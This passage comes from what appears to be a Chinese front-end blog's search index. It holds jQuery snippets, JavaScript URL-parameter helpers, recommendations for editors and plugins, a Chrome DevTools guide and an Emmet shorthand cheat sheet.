中经常大量使用的动画。你可能仅仅想在用户做某些点击事件的时候显示一个元素,这时候需要淡入/淡出或者滑动方法。但是如果你需要那个元素在你第一次点击的时候出现,在第二次点击的时候消失,代码如下。// Fade $(&quot;.btn&quot;).click(function() { $(&quot;.element&quot;).fadeToggle(&quot;slow&quot;); }); // Toggle $(&quot;.btn&quot;).click(function() { $(&quot;.element&quot;).slideToggle(&quot;slow&quot;); }); 简单的手风琴这是个简单快速的方法创建一个手风琴。// Close all panels $(&quot;#accordion&quot;) .find(&quot;.content&quot;) .hide(); // Accordion $(&quot;#accordion&quot;) .find(&quot;.accordion-header&quot;) .click(function() { var next = $(this).next(); next.slideToggle(&quot;fast&quot;); $(&quot;.content&quot;) .not(next) .slideUp(&quot;fast&quot;); return false; }); 通过添加这个脚本,你需要做的则是必要的 HTML 操作在你的页面上。使两个 DIV 同等高度有时你会想要两个 DIV 有相同的高度,无论他们都有什么内容.$(&quot;.div&quot;).css(&quot;min-height&quot;, $(&quot;.main-div&quot;).height()); 这个例子设置了 DIV 的最小高度,这意味着它的高度只可以比这个设置的高度大而不能小。然而,一个更灵活的方法是循环的一组元素,并设置将最高元素的高度作为高度。var $columns = $(&quot;.column&quot;); var height = 0; $columns.each(function() { if ($(this).height() &gt; height) { height = $(this).height(); } }); $columns.height(height); 如果你想要所有的列有相同的高度。var $rows = $(&quot;.same-height-columns&quot;); $rows.each(function() { $(this) .find(&quot;.column&quot;) .height($(this).height()); }); 在浏览器标签 / 新窗口打开外部链接在新的浏览器标签或窗口中打开外部链接,并确保在同一个标签或窗口中打开的是同一个源的链接。$(&#39;a[href^=&quot;http&quot;]&#39;).attr(&quot;target&quot;, &quot;_blank&quot;); $(&#39;a[href^=&quot;//&quot;]&#39;).attr(&quot;target&quot;, &quot;_blank&quot;); $(&#39;a[href^=&quot;&#39; + window.location.origin + &#39;&quot;]&#39;).attr(&quot;target&quot;, &quot;_self&quot;); 备注：window.location.origin 在 IE10 不工作。根据文本获取元素通过 jQuery 中的 contains()选择器,你能找到一个元素内的文本内容。如果文本不存在,则这个元素将被隐藏。通常用于站内搜素。var search = $(&quot;#search&quot;).val(); $(&#39;div:not(:contains(&quot;&#39; + search + &#39;&quot;))&#39;).hide(); 可见变化的触发当用户不再聚焦或者重新聚焦一个标签时触发 javascript 脚本。$(document).on(&quot;visibilitychange&quot;, function(e) { if (e.target.visibilityState === &quot;visible&quot;) { console.log(&quot;Tab is now in view!&quot;); } else if (e.target.visibilityState === &quot;hidden&quot;) { console.log(&quot;Tab is now hidden!&quot;); } }); Ajax 调用错误处理当一个 Ajax 调用返回一个 404 或 500 的错误时,将执行该错误处理。如果该处理未定义,则其他 jQuery 代码便可能不会执行了。定义一个全局 Ajax 错误处理程序。$(document).ajaxError(function(e, xhr, settings, error) { console.log(error); }); 解决 jQuery, prototype 共存冲突问题&lt;script src=&quot;prototype.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; jQuery.noConflict(); &lt;/script&gt; 注意：一定要先引入 prototype.js 再引入 jquery.js,先后顺序不可错链式操作jQuery 允许通过链式操作来减轻反复查询 DOM 和创建多个 jQuery 对象的过程。比如下面是你的方法调用。$(&quot;#elem&quot;).show(); $(&quot;#elem&quot;).html(&quot;bla&quot;); $(&quot;#elem&quot;).otherStuff(); 这代码可以通过链式大大的提高。$(&quot;#elem&quot;) .show() .html(&quot;bla&quot;) .otherStuff(); 另一个方法是在一个可变的元素缓存（$ 作为前置）。var $elem = $(&quot;#elem&quot;); $elem.hide(); $elem.html(&quot;bla&quot;); $elem.otherStuff(); 链式和 jQuery 缓存方法是最好的做法,导致更短、更快的代码。]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 获取 URL 请求参数]]></title>
    <url>%2Farchives%2F9d963a10.html</url>
    <content type="text"><![CDATA[通过 JavaScript 原生方法,获取 URL 所带的请求参数备用方法一(使用正则表达式匹配)方法源码function GetValue(name) { var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;); var r = window.location.search.substr(1).match(reg); if (r != null) return unescape(r[2]); return null; } 如何使用？若地址栏 URL 为： abc.html?id=1234&amp;&amp;url=https://www.baidu.com 则console.log(GetValue(&quot;id&quot;)); 输出 =&gt; 123console.log(GetValue(&quot;url&quot;)); 输出 =&gt; https://www.baidu.com`方法二（普通字符串截取）方法源码function GetRequest() { var url = location.search; var theRequest = new Object(); if (url.indexOf(&quot;?&quot;) != -1) { var str = url.substr(1); strs = str.split(&quot;&amp;&quot;); for (var i = 0;i &lt; strs.length;i++) { theRequest[strs[i].split(&quot;=&quot;)[0]] = strs[i].split(&quot;=&quot;)[1]; } } return theRequest; } 如何使用？&lt;script type=&quot;text/javascript&quot;&gt; var Request = new Object(); Request = GetRequest(); &lt;/script&gt; 若地址栏 URL 为： abc.html?id=1234&amp;&amp;url=https://www.baidu.com 则console.log(Request[&quot;id&quot;]); 输出=&gt; 123console.log(Request[&quot;url&quot;]); 输出 =&gt; https://www.baidu.com`]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[需要一款称手的编辑器]]></title>
    <url>%2Farchives%2F60ce49fe.html</url>
    <content type="text"><![CDATA[以下介绍的编辑器是跨平台,无论是 Windows,还是 Liunx,甚至是 Mac,都可以成为程序员称手的利器Atom开源。功能强大,是 Github 团队推出的简洁编辑器,自带 Node.js 环境。下载地址官网下载地址：Atom官网下载地址下不下来点击以下链接下载：atom-amd64.deb AtomSetup.exe安装插件使用 Ctrl+, 调出设置页面,在 install 中查询插件并安装。自带 Node.js 环境。部分插件支持自定义设置。插件推荐emmet =&gt; 前端开发者必备atom-beautify =&gt; 格式化编程语言文件,支持的语法较广,如 PHP、Python、Ruby、Java、C 等atom-html-perview =&gt; html 文件实时预览atom-minify =&gt; 压缩 Html、CSS文件autoprefixer =&gt; CSS3 私有前缀自动补全插件csscomb =&gt; CSS 属性自动排序docblockr =&gt; 可以自动生成 PHPDoc 风格的注释atom-ternjs =&gt; javascript 代码提示autocomplete-paths =&gt; 引入文件时,自动补全路径language-markdown =&gt; markdown 文件语法高亮language-vue =&gt; vue 文件语法高亮logo-file-icons =&gt; 文件图标markdown-scroll-sync =&gt; markdown 文件预览自动滚动simplified-chinese-menu =&gt; Atom 简体中文语言包vue-autocomplete =&gt; vue 文件代码自动提示vue-format =&gt; vue 文件自动格式化sync-settings =&gt; atom 插件备份(需要 Githunb Access Token 和 Gist Id)Brackets开源。功能强大,是一个非常优秀的 WEB 设计和前端开发的源代码编辑器。当然也支持 C、 Java、 Python 等编程语言。支持实时预览。自带 Node.js 环境。下载地址Brackets官网下载地址下不下来点击以下链接下载：Brackets.Release.1.8.msiBrackets.Release.1.8.64-bit.deb安装插件部分插件是使用国外源的,很容易被墙的。所以系统最好要有个代理服务器,这里推荐 高梯子。如何安装最快速的安装 Brackets 扩展的方法是使用扩展管理器（Extension Manager）– 直接在 Brackets 的工具栏选择 File &gt; Extension Manager 即可。修改界面语言改成中文。 Debug-&gt;Switch Language插件推荐Emmet =&gt; 前端开发者必备Autoprefixer =&gt; CSS3 私有前缀自动补全插件CSScomb =&gt; CSS 属性自动排序Brackets Icons =&gt; 为你的 Brackets 边栏添加文件图标Brackets CSS Class Code hint =&gt; 输入 class 或 id 时会出现 css 里面的 class／idJS CSS Minifier =&gt; 压缩 JS 和 CSS 文件Beautify =&gt; 这个扩展可以让你的 HTML、 CSS、 JavaScript 等代码格式化一致,从而提升可读性Simple To-Do =&gt; 使用 Simple To-Do 可以确保你不会忘记项目的任务。它允许你在 Brackets 中为每一个项目创建 TODO 列表。Markdown Preview =&gt; Markdown 文件实时预览Markdown Toolbar =&gt; Markdown 文件的快捷工具栏JavaScript Globals =&gt; javascript 全局变量高亮Brackets Vue =&gt; Vue 文件语法高亮Sublime Text 3非开源。功能强大,可以编译 C、 Java、 Python 等编程语言。Liunx 下启动可以在终端输入 subl。部分插件依赖于 Node.js。下载地址官网下载地址：Sublime Text 3官网下载地址下不下来点击以下链接下载：Sublime Text Build 3126 Setup.exeSublime Text Build 3126 x64 Setup.exe安装插件直接安装：安装 Sublime text 3 插件很方便,可以直接下载安装包解压缩到 Packages 目录（菜单-&gt;preferences-&gt;packages）使用 Package Control 安装安装 Package Control 组件按 Ctrl+ 调出 console 粘贴以下代码到底部命令行并回车：import urllib.request,os;pf = &#39;Package Control.sublime-package&#39;;ipp = sublime.installed_packages_path();urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) );open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39;%20&#39;)).read()) 重启 Sublime Text 3。 如果在 Perferences -&gt; package settings 中看到 package control 这一项,则安装成功。 顺便贴下 Sublime Text2 的代码。import urllib2,os;pf=&#39;Package Control.sublime-package&#39;;ipp = sublime.installed_packages_path();os.makedirs( ipp ) if not os.path.exists(ipp) else None;urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler( )));open( os.path.join( ipp, pf), &#39;wb&#39; ).write( urllib2.urlopen( &#39;http://sublime.wbond.net/&#39; +pf.replace( &#39; &#39;,&#39;%20&#39; )).read());print( &#39;Please restart Sublime Text to finish installation&#39;) 用组件安装插件的方法：按下 Ctrl+Shift+P 调出命令面板输入 install 调出 Install Package 选项并回车,然后在列表中选中要安装的插件。注意国内使用 Sublime Text 3,经常可能遇到无法安装可用插件问题,可 remove 掉 Package Control 重新安装下；如遇到连 Package Control 也无法安装,则可以在别处拷贝一份关于 Package Control 的文件(Package Control.sublime-package)存放于 Installed Packages 目录之下即可插件推荐Emmet =&gt; 前端开发者必备Autoprefixer =&gt; CSS3 私有前缀自动补全插件CSScomb =&gt; CSS 属性自动排序JsFormat =&gt; 一个 JS 代码格式化插件Tag =&gt; 格式化 Html/Xml 代码phpFormat =&gt; 格式化 php 代码HTML-CSS-JS Prettify =&gt; 一款集成了格式化（美化）html、css、js 三种文件类型的插件,依赖于 Node.jsMinify =&gt; 自动压缩 JS、CSS 文件ColorPicker =&gt; 颜色选择器BracketHighlighter =&gt; 类似于代码匹配,可以匹配括号,引号等符号内的范围SublimeCodeIntel =&gt; 代码自动提示SublimeLinter =&gt; 用于高亮提示用户编写的代码中存在的不规范和错误的写法DocBlockr =&gt; 可以自动生成 PHPDoc 风格的注释ChineseLocalizations =&gt; 汉化 Sublime TextMarkDownEditing =&gt; markdown 文件语法高亮vue Syntax Highlight =&gt; vue 文件语法高亮Visual Studio Code微软开发的一款编辑器,免费而且跨平台,可以编写 C、 Java、 Python 等代码,在界面上与 Sublime Text 非常相似下载地址官网下载地址：VS code安装插件使用 Ctrl + Shift + X 调出安装插件界面插件推荐HTML Snippets =&gt; 超级实用且初级的 H5 代码片段以及提示HTML CSS Support =&gt; 让 html 标签上写 class 智能提示当前项目所支持的样式Debugger for Chrome =&gt; 让 vscode 映射 chrome 的 debug 功能,静态页面都可以用 vscode 来打断点调试vscode-icons =&gt; 让 vscode 资源树目录加上图标Path Intellisense =&gt; 自动路劲补全,默认不带这个功能的Document this =&gt; js 的注释模板ESlint =&gt; 代码规范性检查vetur =&gt; vue 语法高亮Git Easy =&gt; git 管理]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于 Chrome 浏览器的调试方法]]></title>
    <url>%2Farchives%2F3861842.html</url>
    <content type="text"><![CDATA[作为前端开发人员,最佳的调试环境便是浏览器自带的开发者工具,此文则介绍 Chrome 浏览器的开发者工具的使用方法Chrome 浏览器调试窗口中常用的标签页Elements：用于查看页面 html 代码NetWork：用于查看页面的网络请求Sources：用于查看页面所加载的源文件Timeline：用于查看页面加载 JavaScript、页面元素渲染等的时间Profiles：用于做性能优化的,包括查看 CPU 执行时间与内存占用Resources：用于查看保存再本地的一些信息,比如 cookie 等Audits：一般用于优化前端页面、加速网页加载速度Console：JavaScript 控制台,这个面板可以查看错误信息、打印调试信息、写一些测试脚本,还可以当作 JavaScript API 查看用。Chrome 浏览器不仅可以调试页面、 JavaScript、请求、资源、 cookie,还可以模拟手机进行调试打开调试方法方法一直接在页面上点击右键,然后选择审查元素方法二在 Chrome 的工具中找到开发者工具方法三使用快捷键 Ctrl+Shift+I (或者 Ctrl+Shift+J 直接打开控制台),或者直接按 F12Elements 标签页Elements 标签页的左侧就是对页面 HTML 结构的查看与编辑,你可以直接在某个元素上双击修改元素的属性。Add attribute：向该元素添加其他的属性Edit as HTML：直接对元素的 HTML 进行编辑,或者删除某个元素,所有的修改都会即时在页面上得到呈现。Copy：可以将 HTML 代码直接复制下来,在拷贝别人网站上面的 HTML 代码的时候灰常方便,你懂的~~Hide element：隐藏该元素Delete element：删掉该元素Scroll into view：视图滚动到选择的位置Break on：可以对某个元素进行监听,在 JavaScript 中对元素的属性或者 HTML 进行修改的时候,直接触发断点,跳转到对改元素进行修改的 JavaScript 代码处Elements 标签页的右侧可以对元素的 CSS 进行查看与编辑修改Styles：看 HTML 元素的样式Computed：可以看元素的盒子模型Event Listeners：对元素的监听方法将会显示在这里DOM Breakpoints：DOM 树的断点调试,（通过右键某一个元素,依次选择 Break on,选择 Attributes modifications）,设置后刷新页面,当元素的属性发生改变时,暂停脚本并定位到该位置Properties：可以查看到元素具有的方法与属性,比查 API手册要方便得多Network 标签页Network 标签页对于分析网站请求的网络情况、查看某一请求的请求头和响应头还有响应内容很有用。 注意是在你打开 Chrome 开发者工具后发起的请求,才会在这里显示的哦。点击左侧某一个具体请求 URL,可以看到该请求的详细 HTTP 请求情况我们可以在这里看到 HTTP 请求头、HTTP 响应头、HTTP 返回的内容等信息。Headers：请求头信息和响应头信息Preview：预览结果,如果是文件可以查看这个文件；如果是图片可以预览这个图片；如果是从服务器返回来的 JSON 数据,可以查看格式话后的 JSONResponse：从服务器返回的响应结果Cookies：请求和响应的 CookieTiming：具体的响应时间Sources 标签页Sources 标签页可以查看到请求的资源情况,包括 CSS、 JavaScript、图片等的内容。也可以设置各种断点。对存储的内容进行编辑然后保存也会实时的反应到页面上。Audits 标签页这个对于优化前端页面、加速网页加载速度很有用哦。（相当与 Yslow）Console 标签页JavaScript 控制台,前端开发人员最经常使用它来调试 js 的错误。移动端开发调试可以模拟出不同分辨率的移动端显示的效果,此效果仅供参考,因为还有可能受浏览器的不同而显示效果不同。]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>Debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Emmet 用法举例]]></title>
    <url>%2Farchives%2Fe4d9b9eb.html</url>
    <content type="text"><![CDATA[Emmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话,对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码,大大提高了 HTML/CSS 代码编写的速度基本语法子元素: &gt;例子nav&gt;ul&gt;li&lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; 兄弟元素: +例子div+p+bq&lt;div&gt;&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;blockquote&gt;&lt;/blockquote&gt; 在某个元素之上: ^例子一div+div&gt;p&gt;span+em^bq&lt;div&gt;&lt;/div&gt; &lt;div&gt; &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt; &lt;blockquote&gt;&lt;/blockquote&gt; &lt;/div&gt; 例子二div+div&gt;p&gt;span+em^^bq&lt;div&gt;&lt;/div&gt; &lt;div&gt; &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt; &lt;/div&gt; &lt;blockquote&gt;&lt;/blockquote&gt; 分为一组: ()例子一div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p&lt;div&gt; &lt;header&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/header&gt; &lt;footer&gt; &lt;p&gt;&lt;/p&gt; &lt;/footer&gt; &lt;/div&gt; 例子二(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p&lt;div&gt; &lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &lt;footer&gt; &lt;p&gt;&lt;/p&gt; &lt;/footer&gt; 倍增元素: *例子ul&gt;li*5&lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; 项目数字递增: $例子一ul&gt;li.item$*5&lt;ul&gt; &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt; &lt;/ul&gt; 例子二h$[title=item$]{Header $}*3&lt;h1 title=&quot;item1&quot;&gt;Header 1&lt;/h1&gt; &lt;h2 title=&quot;item2&quot;&gt;Header 2&lt;/h2&gt; &lt;h3 title=&quot;item3&quot;&gt;Header 3&lt;/h3&gt; 例子三ul&gt;li.item$$$*5&lt;ul&gt; &lt;li class=&quot;item001&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item002&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item003&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item004&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item005&quot;&gt;&lt;/li&gt; &lt;/ul&gt; 例子四ul&gt;li.item$@-*5&lt;ul&gt; &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt; &lt;/ul&gt; 例子五ul&gt;li.item$@3*5&lt;ul&gt; &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item6&quot;&gt;&lt;/li&gt; &lt;li class=&quot;item7&quot;&gt;&lt;/li&gt; &lt;/ul&gt; ID 和 CLASS 属性例子一`header`&lt;div id=&quot;header&quot;&gt;&lt;/div&gt; 例子二.title&lt;div class=“title”&gt;&lt;/div&gt; 例子一footer#search.wide&lt;footer id=&quot;search&quot; class=&quot;wide&quot;&gt;&lt;/footer&gt; 例子四p.class1.class2.class3&lt;p class=&quot;class1 class2 class3&quot;&gt;&lt;/p&gt; 自定义属性例子一p[title=&quot;Hello world&quot;]&lt;p title=&quot;Hello world&quot;&gt;&lt;/p&gt; 例子二td[rowspan=2 colspan=3 title]&lt;td rowspan=&quot;2&quot; colspan=&quot;3&quot; title=&quot;&quot;&gt;&lt;/td&gt; 例子三[a=&quot;value1&quot; b=&quot;value2&quot;]&lt;div a=&quot;value1&quot; b=&quot;value2&quot;&gt;&lt;/div&gt; 文本内容: {}例子一a{Click me}&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt; 例子二p&gt;{Click }+a{here}+{ to continue}&lt;p&gt;Click &lt;a href=&quot;&quot;&gt;here&lt;/a&gt; to continue&lt;/p&gt; 缺省标签名例子一.class1&lt;div class=&quot;class1&quot;&gt;&lt;/div&gt; 例子二em&gt;.class1&lt;em&gt;&lt;span class=&quot;class1&quot;&gt;&lt;/span&gt;&lt;/em&gt; 例子三ul&gt;.class1&lt;ul&gt; &lt;li class=&quot;class1&quot;&gt;&lt;/li&gt; &lt;/ul&gt; 例子四table&gt;.row&gt;.col&lt;table&gt; &lt;tr class=&quot;row&quot;&gt; &lt;td class=&quot;col&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; HTMLHTML 基本模板doc扩展写法html&gt;(header&gt;meta[charset=UTF-8]+title{${1:Document}})+body&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; ! 或者 html:5扩展写法!!!+doc[lang=${lang}]&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; doc4扩展写法html&gt;(head&gt;meta[http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=${charset}&quot;]+title{${1:Document}})+body&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; html:4t扩展写法!!!4t+doc4[lang=${lang}]&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;https://www.w3.org/TR/html4/loose.dtd&quot;&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; html:4s扩展写法!!!4s+doc4[lang=${lang}]&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;https://www.w3.org/TR/html4/strict.dtd&quot;&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; HTML 基本元素Aa:link&lt;a href=&quot;//&quot;&gt;&lt;/a&gt; a:mail&lt;a href=&quot;mailto:&quot;&gt;&lt;/a&gt; area&lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt; area:d&lt;area shape=&quot;default&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt; area:c&lt;area shape=&quot;circle&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt; area:r&lt;area shape=&quot;rect&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt; area:p&lt;area shape=&quot;poly&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt; Bbtn:r&lt;button type=&quot;reset&quot;&gt;&lt;/button&gt; btn:s&lt;button type=&quot;submit&quot;&gt;&lt;/button&gt; Fform:get&lt;form action=&quot;get&quot;&gt;&lt;/form&gt; form:post&lt;form action=&quot;post&quot;&gt;&lt;/form&gt; Llink&lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt; link:css&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; link:print&lt;link rel=&quot;stylesheet&quot; href=&quot;print.css&quot; media=&quot;print&quot;&gt; link:favicon&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;favicon.ico&quot;&gt; link:touch&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;favicon.png&quot;&gt; Iimg&lt;img src=&quot;&quot; alt=&quot;&quot;&gt; input&lt;input type=&quot;text&quot;&gt; inp这种写法也适用：input:text input:t&lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:hideen这种写法也适用：input:h&lt;input type=&quot;hidden&quot; name=&quot;&quot;&gt; input:search&lt;input type=&quot;search&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:email&lt;input type=&quot;email&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:url&lt;input type=&quot;url&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:password这种写法也适用：input:p&lt;input type=&quot;password&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:datetime&lt;input type=&quot;datetime&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:date&lt;input type=&quot;date&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:datetime-local&lt;input type=&quot;datetime-local&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:month&lt;input type=&quot;month&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:week&lt;input type=&quot;week&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:time&lt;input type=&quot;time&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:number&lt;input type=&quot;number&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:color&lt;input type=&quot;color&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:checkbox这种写法也适用：input:c&lt;input type=&quot;checkbox&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:radio这种写法也适用：input:r&lt;input type=&quot;radio&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:range&lt;input type=&quot;range&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:file这种写法也适用：input:f&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot;&gt; input:submit这种写法也适用：input:s&lt;input type=&quot;submit&quot; value=&quot;&quot;&gt; input:image这种写法也适用：input:i&lt;input type=&quot;image&quot; src=&quot;&quot; alt=&quot;&quot;&gt; input:button这种写法也适用：input:b&lt;input type=&quot;button&quot; value=&quot;&quot;&gt; input:reset&lt;input type=&quot;reset&quot; value=&quot;&quot;&gt; Mmeta:utf&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt; meta:win&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=windows-1251&quot;&gt; meta:vp&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minmum-scale=1.0&quot;&gt; meta:compat&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot;&gt; menu:context这种写法也适用：menu:c&lt;menu type=&quot;context&quot;&gt;&lt;/menu&gt; menu:toolbar这种写法也适用：menu:t&lt;menu type=&quot;toolbar&quot;&gt;&lt;/menu&gt; CSS视觉格式positionpos =&gt; position: relative;pos:s =&gt; position: static;pos:a =&gt; position: relative;pos:r =&gt; position: relative;pos:f =&gt; position: fixed;t =&gt; top: ;t:a =&gt; top: auto;l =&gt; left: ;l:a =&gt; left: auto;b =&gt; bottom: ;b:a =&gt; bottom: auto;r =&gt; right: ;r:a =&gt; right: auto;z =&gt; z-indet: ;z:a =&gt; z-indet: auto;floatfl =&gt; float: left;fl:n =&gt; float: none;fl:l =&gt; float: left;fl:r =&gt; float: right;cl =&gt; clear: both;cl:n =&gt; clear: none;cl:l =&gt; clear: left;cl:r =&gt; clear: right;cl:b =&gt; clear: both;dispalyd =&gt; display: block;d:n =&gt; display: none;d:b =&gt; display: block;d:i =&gt; display: inline;d:ib =&gt; display: inline-block;d:f =&gt; display: flex;d:if =&gt; display: inline-flex;d:li =&gt; display: list-item;d:ri =&gt; display: run-in;d:cp =&gt; display: compat;d:tb =&gt; display: table;d:itb =&gt; display: inline-table;d:tbcp =&gt; display: table-caption;d:tbcl =&gt; display: table-column;d:tbclg =&gt; display: table-column-group;d:tbhg =&gt; display: table-header-group;d:tbfg =&gt; display: table-footer-group;d:tbr =&gt; display: table-row;d:tbrg =&gt; display: table-row-group;d:tbc =&gt; display: table-cell;visibilityv =&gt; visibility: hidden;v:v =&gt; visibility: visible;v:h =&gt; visibility: hidden;v:c =&gt; visibility: collapse;overflowov =&gt; overflow: hidden;ov:v =&gt; overflow: visible;ov:h =&gt; overflow: hidden;ov:s =&gt; overflow: scroll;ov:a =&gt; overflow: auto;ovx =&gt; overflow-x: hidden;ovx:v =&gt; overflow-x: visible;ovx:h =&gt; overflow-x: hidden;ovx:s =&gt; overflow-x: scroll;ovx:a =&gt; overflow-x: auto;ovy =&gt; overflow-x: hidden;ovy:v =&gt; overflow-y: visible;ovy:h =&gt; overflow-y: hidden;ovy:s =&gt; overflow-y: scroll;ovy:a =&gt; overflow-y: auto;ovs =&gt; overflow-style: scrollbar;ovs:a =&gt; overflow-style: auto;ovs:s =&gt; overflow-style: scrollbar;ovs:p =&gt; overflow-style: panner;ovs:m =&gt; overflow-style: move;ovs:mq =&gt; overflow-style: marquee;clipcp =&gt; clip: ;cp:a =&gt; clip: auto;cp:r =&gt; clip: rect(top right bottom left);resizersz =&gt; resize: ;rsz:n =&gt; resize: none;rsz:b =&gt; resize: both;rsz:h =&gt; resize: horizontal;rsz:v =&gt; resize: vertical;cursorcur =&gt; cursor: pointer;cur:a =&gt; cursor: auto;cur:d =&gt; cursor: default;cur:c =&gt; cursor: 